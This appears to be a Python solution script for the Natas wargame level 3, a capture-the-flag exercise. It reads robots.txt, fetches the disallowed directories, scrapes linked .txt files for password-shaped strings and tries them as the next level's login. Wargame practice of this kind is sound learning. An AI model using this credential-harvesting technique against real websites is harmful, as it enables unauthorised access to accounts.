"""
natas3: leaky robots.txt
"""

import re
import requests
from bs4 import BeautifulSoup
from typing import Optional

from natas_utils import *

LEVEL = 3

def solve(url: str, login: LevelLogin) -> Optional[str]:
    robots = requests.get(url + "/robots.txt", auth=login)
    robots.raise_for_status()

    # print(robots.text)

    forbidden_paths = [line.split()[1] for line in filter(lambda l: l.startswith("Disallow"), robots.text.split('\n'))]

    candidate_passwords = list()

    for path in forbidden_paths:
        response = requests.get(url + path, auth=login)
        soup = BeautifulSoup(response.text, "html.parser")

        filename_elems = soup.find_all("a", attrs={"href": re.compile(r"\.txt$")}, recursive=True)

        for elem in filename_elems:
            filename = elem.text
            response = requests.get(url + path + filename, auth=login)

            matches = re.findall(PW_FORMAT, response.text)
            if len(matches) >= 1:
                candidate_passwords.extend(matches)

    natas4_password = try_level_login(LEVEL + 1, candidate_passwords)

    return natas4_password

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    natas4_password = solve(url, login)

    if natas4_password:
        print("natas4:", natas4_password)
        store_level_password(LEVEL + 1, natas4_password)